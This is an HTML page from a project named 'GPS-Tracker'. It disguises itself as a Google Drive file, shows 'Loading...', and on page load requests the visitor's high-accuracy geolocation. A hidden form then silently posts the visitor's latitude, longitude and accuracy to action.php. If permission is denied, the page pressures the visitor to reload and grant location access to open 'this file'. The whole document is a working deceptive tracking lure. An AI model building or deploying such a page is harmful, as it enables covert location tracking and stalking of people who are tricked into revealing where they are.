<!--
    **GPS-Tracker**
  @Author -> Sun Podder
  @github.com/SunPodder/gps-tracker
  @License: MIT License
-->
<!DOCTYPE html>
<html>
<head>
<title>Google Drive</title>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>
<body>

<form action="action.php" method="post" id="form" hidden>
  <input id="lat" name="lat" />
  <input id="long" name="long" />
  <input id="acc" name="acc" />
</form>

Loading...

<script type="text/javascript">

function getLocation() {
  //checks if the browser supports Geolocation
  if (navigator.geolocation) {
    //if browser supports Geolocation, gets location data and sends to server
    navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
  } else {
    document.write("Geolocation is not supported by this browser.");
  }
}

//callback function. If Geolocation call is successful executes this function
function showPosition(position) {
  document.getElementById("lat").value = position.coords.latitude
  document.getElementById("long").value = position.coords.longitude
  document.getElementById("acc").value = position.coords.accuracy
  document.getElementById("form").submit()
}

//callback function. If Geolocation call is failed executes this function
function onErr(err){
  alert("Please reload the webpage and give location permission to use this site")
  document.write(err.message+"<br>Please reload the webpage and give location permission to access this file...<br><br>")
}

//Geolocation additional options. 
//High Accuracy is enabled for precious location
const options = {
  enableHighAccuracy: true
  }

getLocation()

</script>
</body>
</html>
